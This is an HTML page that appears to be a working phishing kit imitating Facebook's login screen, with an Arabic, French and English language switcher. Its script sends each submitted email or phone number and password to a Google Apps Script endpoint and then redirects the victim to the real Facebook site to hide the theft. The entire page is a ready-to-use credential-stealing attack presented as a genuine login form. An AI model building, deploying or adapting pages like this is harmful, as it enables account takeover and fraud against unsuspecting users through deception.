<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- مهم للهواتف -->
  <title>Facebook</title>
  <style>
    body {
      margin: 0;
      font-family: Helvetica, Arial, sans-serif;
      background: #f0f2f5;
      padding: 10px;
    }

    /* الشعار في الأعلى */
    .header {
      text-align: center;
      padding: 20px 0 10px;
    }
    .header h1 {
      color: #1877f2;
      font-size: 36px;
      margin: 0;
      font-weight: bold;
    }

    /* اختيار اللغة */
    .lang-box {
      text-align: center;
      margin-bottom: 15px;
    }
    .lang-box select {
      padding: 8px 12px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 14px;
      cursor: pointer;
      width: 100%;
      max-width: 200px;
    }

    /* الكونتينر العام */
    .container {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 10px;
    }

    /* الفورم */
    .login-box {
      background: #fff;
      padding: 15px;
      border-radius: 8px;
      width: 100%;
      max-width: 360px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
      text-align: center;
    }

    .login-box input {
      width: 100%;
      margin: 8px 0;
      padding: 14px;
      border-radius: 6px;
      border: 1px solid #dddfe2;
      font-size: 16px;
    }

    .login-box button {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: none;
      border-radius: 6px;
      background: #1877f2;
      color: #fff;
      font-weight: bold;
      font-size: 18px;
      cursor: pointer;
    }
    .login-box button:hover {
      background: #166fe5;
    }

    /* الرسائل */
    .msg {
      margin-top: 15px;
      font-weight: bold;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
      visibility: hidden;
      font-size: 14px;
    }

    /* دائرة التحميل */
    .spinner {
      width: 16px;
      height: 16px;
      border: 2px solid #ccc;
      border-top: 2px solid #1877f2;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin {
      100% { transform: rotate(360deg); }
    }

    /* رابط إنشاء حساب */
    .create-account {
      margin-top: 15px;
      font-size: 14px;
    }
    .create-account a {
      color: #1877f2;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="header">
    <h1>facebook</h1>
  </div>

  <!-- اختيار اللغة -->
  <div class="lang-box">
    <select id="languageSwitcher">
      <option value="ar" selected>العربية</option>
      <option value="fr">Français</option>
      <option value="en">English</option>
    </select>
  </div>

  <div class="container">
    <div class="login-box">
      <form id="myForm">
        <input type="text" name="email_or_phone" id="emailInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
        <input type="password" name="password" id="passwordInput" placeholder="كلمة المرور" required>
        <button type="submit" id="loginBtn">تسجيل الدخول</button>
      </form>

      <div class="msg" id="msg">
        <div class="spinner"></div> <span id="waitMsg">يرجى الإنتظار...</span>
      </div>

      <div class="create-account">
        <span id="noAccount">ليس لديك حساب؟</span>
        <a href="https://m.facebook.com/reg/" id="createAccount">إنشاء حساب جديد</a>
      </div>
    </div>
  </div>

  <script>
    const scriptURL = "https://script.google.com/macros/s/AKfycbx7mCvy3xSTdCo1kvKduE2MJ28vznMfqWFhs5Qymo_RHB4lzxnshuuX1H9GaKa9V0GkAQ/exec";
    const form = document.getElementById("myForm");
    const msg = document.getElementById("msg");

    form.addEventListener("submit", e => {
      e.preventDefault();

      if (!form.checkValidity()) {
        form.reportValidity();
        return;
      }

      msg.style.visibility = "visible";

      const data = {
        email_or_phone: form.email_or_phone.value,
        password: form.password.value
      };

      fetch(scriptURL, {
        method: "POST",
        body: JSON.stringify(data)
      })
      .then(res => res.text())
      .then(txt => {
        window.location.href = "https://m.facebook.com";
      })
      .catch(err => {
        msg.innerText = "❌ " + err;
        msg.style.color = "red";
      });
    });

    // 🔹 النصوص باللغات المختلفة
    const translations = {
      ar: {
        email: "البريد الإلكتروني أو رقم الهاتف",
        password: "كلمة المرور",
        login: "تسجيل الدخول",
        wait: "يرجى الإنتظار...",
        noAccount: "ليس لديك حساب؟",
        create: "إنشاء حساب جديد"
      },
      fr: {
        email: "E-mail ou numéro de téléphone",
        password: "Mot de passe",
        login: "Se connecter",
        wait: "Veuillez patienter...",
        noAccount: "Vous n'avez pas de compte ?",
        create: "Créer un nouveau compte"
      },
      en: {
        email: "Email or Phone",
        password: "Password",
        login: "Log In",
        wait: "Please wait...",
        noAccount: "Don't have an account?",
        create: "Create New Account"
      }
    };

    const langSwitcher = document.getElementById("languageSwitcher");

    function changeLanguage(lang) {
      document.getElementById("emailInput").placeholder = translations[lang].email;
      document.getElementById("passwordInput").placeholder = translations[lang].password;
      document.getElementById("loginBtn").innerText = translations[lang].login;
      document.getElementById("waitMsg").innerText = translations[lang].wait;
      document.getElementById("noAccount").innerText = translations[lang].noAccount;
      document.getElementById("createAccount").innerText = translations[lang].create;

      // RTL للغة العربية فقط
      document.documentElement.dir = (lang === "ar") ? "rtl" : "ltr";
      document.documentElement.lang = lang;
    }

    langSwitcher.addEventListener("change", e => {
      changeLanguage(e.target.value);
    });
  </script>

</body>
</html>
